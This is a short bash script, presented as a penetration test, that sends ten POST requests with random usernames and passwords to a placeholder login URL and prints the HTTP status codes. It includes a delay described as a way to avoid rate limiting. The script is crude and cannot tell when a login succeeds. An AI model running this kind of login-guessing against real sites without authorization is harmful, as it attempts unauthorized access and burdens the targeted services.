#!/bin/bash

# Target URL (Replace with your target login endpoint)
TARGET_URL="https://example.com/login"

# Function to generate a random string
random_string() {
    local length=$1
    tr -dc 'A-Za-z0-9' </dev/urandom | head -c "$length"
}

# Number of attempts
ATTEMPTS=10

# Loop for multiple attempts
for ((i=1; i<=ATTEMPTS; i++)); do
    USERNAME=$(random_string 6)  # Generate a random username (6 characters)
    PASSWORD=$(random_string 10) # Generate a random password (10 characters)

    echo "Trying: $USERNAME / $PASSWORD"

    # Send the login request
    RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$TARGET_URL" \
        -d "username=$USERNAME&password=$PASSWORD" \
        -H "User-Agent: Mozilla/5.0")

    echo "Response Code: $RESPONSE"

    # Delay to avoid rate limiting
    sleep 1
done

echo "Penetration test completed."
